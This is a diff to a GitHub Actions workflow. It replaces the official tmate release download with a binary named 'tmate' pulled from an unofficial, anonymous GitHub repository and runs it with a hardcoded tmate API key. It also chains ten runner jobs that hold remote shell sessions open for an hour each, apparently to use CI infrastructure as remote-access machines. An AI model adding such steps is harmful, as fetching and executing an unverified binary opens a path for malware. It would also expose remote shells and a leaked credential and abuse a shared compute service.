@@ -1,23 +1,36 @@
-name: tmate-5x-parallel
+name: tmate-5x-batch-chain
 
 on:
   workflow_dispatch:
 
 jobs:
-  tmate-parallel:
+  tmate-batch-1:
     runs-on: ubuntu-latest
+    timeout-minutes: 61
     strategy:
       matrix:
-        runner_id: [1, 2, 3, 4, 5]
+        session_num: [1, 2, 3, 4, 5]
       fail-fast: false
     steps:
-      - name: Download tmate (official static build)
+      - name: Download tmate and start session
         run: |
-          wget https://github.com/tmate-io/tmate/releases/download/2.3.1/tmate-static-linux-amd64.tar.xz
-          tar -xf tmate-static-linux-amd64.tar.xz
-          mv tmate-static-linux-amd64/tmate .
+          wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate
           chmod +x tmate
-      - name: Start tmate session
+          ./tmate -F -n ${{ matrix.session_num }} -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg &
+          sleep 3600
+
+  tmate-batch-2:
+    needs: tmate-batch-1
+    runs-on: ubuntu-latest
+    timeout-minutes: 61
+    strategy:
+      matrix:
+        session_num: [6, 7, 8, 9, 10]
+      fail-fast: false
+    steps:
+      - name: Download tmate and start session
         run: |
-          ./tmate -F &
-          sleep 21600
+          wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate
+          chmod +x tmate
+          ./tmate -F -n ${{ matrix.session_num }} -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg &
+          sleep 3600
